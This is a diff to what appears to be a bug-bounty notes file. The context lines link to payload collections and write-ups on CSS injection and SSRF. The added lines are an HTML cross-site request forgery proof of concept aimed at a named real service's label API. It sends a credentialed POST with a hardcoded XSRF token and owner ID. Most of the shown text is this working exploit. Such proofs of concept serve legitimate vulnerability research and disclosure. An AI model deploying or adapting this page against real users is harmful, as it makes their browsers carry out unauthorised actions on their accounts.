@@ -207,3 +207,48 @@ https://github.com/1N3/IntruderPayloads
 CSS Injection--https://github.com/dxa4481/cssInjection
 
 12:https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb --- ssrf 
+------------------------------
+
+<html>
+  <!-- CSRF PoC --->
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https:\/\/cad.onshape.com\/api\/labels", true);
+        xhr.setRequestHeader("Accept-Language", "en_US");
+        xhr.setRequestHeader("Accept", "application\/json, text\/plain, *\/*");
+        xhr.setRequestHeader("Content-Type", "application\/json;charset=utf-8");
+xhr.setRequestHeader("X-XSRF-TOKEN", "viKaZso3CfVRCO8O9aFtRg==");
+
+        xhr.withCredentials = true;
+        var body = "{\"ownerId\":\"5a6b8e3ed4f618103433d730\",\"name\":\"rosane\",\"parentLabelId\":\"\"}";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-----------------------------------
